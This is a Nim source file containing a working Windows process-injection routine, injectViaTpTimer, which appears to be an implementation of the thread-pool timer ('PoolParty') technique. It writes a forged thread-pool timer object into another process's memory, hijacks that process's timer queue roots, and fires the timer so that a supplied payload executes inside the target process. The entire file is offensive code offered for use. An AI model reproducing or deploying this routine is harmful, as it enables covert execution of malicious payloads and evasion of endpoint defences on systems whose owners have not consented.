import winim/lean

import nimpool

proc injectViaTpTimer*(hWorkerFactory: HANDLE, hTimer: HANDLE, pAddress: pointer, tProcess: HANDLE): bool =
  var 
    workerFactoryInfo: WORKER_FACTORY_BASIC_INFORMATION
    remoteTpTimer: PFULL_TP_TIMER
    pFullTpTimer: PFULL_TP_TIMER
    timeOutInterval = -10000000
    dueTime: LARGE_INTEGER
    status: NTSTATUS

  let 
    pNtSetTimer2 = cast[NtSetTimer2](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtSetTimer2"))
    pNtQueryInformationWorkerFactory = cast[NtQueryInformationWorkerFactory](
      GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationWorkerFactory")
    )
  if pNtSetTimer2 == nil or pNtQueryInformationWorkerFactory == nil:
    echo "[!] Failed to get function pointers"
    return false

  # Get worker factory basic information
  status = pNtQueryInformationWorkerFactory(
    hWorkerFactory, workerFactoryBasicInformation, cast[PVOID](workerFactoryInfo.addr), 
    sizeof(WORKER_FACTORY_BASIC_INFORMATION).ULONG, nil
  )
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtQueryInformationWorkerFactory", status)
    return false

  # Create callback structure associated with payload
  pFullTpTimer = cast[PFULL_TP_TIMER](CreateThreadpoolTimer(
    cast[PTP_TIMER_CALLBACK](pAddress), NULL, NULL
  ))
  if pFullTpTimer == nil:
    WIN32_ERR("CreateThreadpoolTimer")
    return false

  # Allocate memory for FULL_TP_TIMER object
  remoteTpTimer = cast[PFULL_TP_TIMER](VirtualAllocEx(
    tProcess, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
  ))
  if remoteTpTimer == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  # Modify elements and write object
  pFullTpTimer.Work.CleanupGroupMember.Pool = cast[PFULL_TP_POOL](workerFactoryInfo.StartParameter)
  pFullTpTimer.DueTime = timeOutInterval

  pFullTpTimer.Union_1.WindowEndLinks.Key = timeOutInterval
  pFullTpTimer.WindowStartLinks.Key = timeOutInterval

  pFullTpTimer.WindowStartLinks.Children.Flink = (remoteTpTimer.WindowStartLinks.Children).addr
  pFullTpTimer.WindowStartLinks.Children.Blink = (remoteTpTimer.WindowStartLinks.Children).addr

  pFullTpTimer.Union_1.WindowEndLinks.Children.Flink = (remoteTpTimer.Union_1.WindowEndLinks.Children).addr
  pFullTpTimer.Union_1.WindowEndLinks.Children.Blink = (remoteTpTimer.Union_1.WindowEndLinks.Children).addr

  if WriteProcessMemory(tProcess, remoteTpTimer, pFullTpTimer, sizeof(FULL_TP_TIMER), NULL) == 0:
    WIN32_ERR("WriteProcessMemory [1]")
    return false

  # Change WindowStart.Root and WindowEnd.Root to point to the TP_TIMER callback
  let pTpTimerWindowStartLinks = (remoteTpTimer.WindowStartLinks).addr

  if WriteProcessMemory(
    tProcess, (pFullTpTimer.Work.CleanupGroupMember.Pool.TimerQueue.AbsoluteQueue.WindowStart.Root).addr,
    cast[PVOID](pTpTimerWindowStartLinks.addr), sizeof(pTpTimerWindowStartLinks), NULL
  ) == 0:
    WIN32_ERR("WriteProcessMemory [2]")
    return false

  let pTpTimerWindowEndLinks = (remoteTpTimer.Union_1.WindowEndLinks).addr

  if WriteProcessMemory(
    tProcess, (pFullTpTimer.Work.CleanupGroupMember.Pool.TimerQueue.AbsoluteQueue.WindowEnd.Root).addr,
    cast[PVOID](pTpTimerWindowEndLinks.addr), sizeof(pTpTimerWindowEndLinks), NULL
  ) == 0:
    WIN32_ERR("WriteProcessMemory [3]")
    return false

  # Trigger the callback
  dueTime.QuadPart = timeOutInterval
  var timerParameters: T2_SET_PARAMETERS

  status = pNtSetTimer2(hTimer, dueTime.addr, NULL, timerParameters.addr)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtSetTime2", status)
    return false

  return true
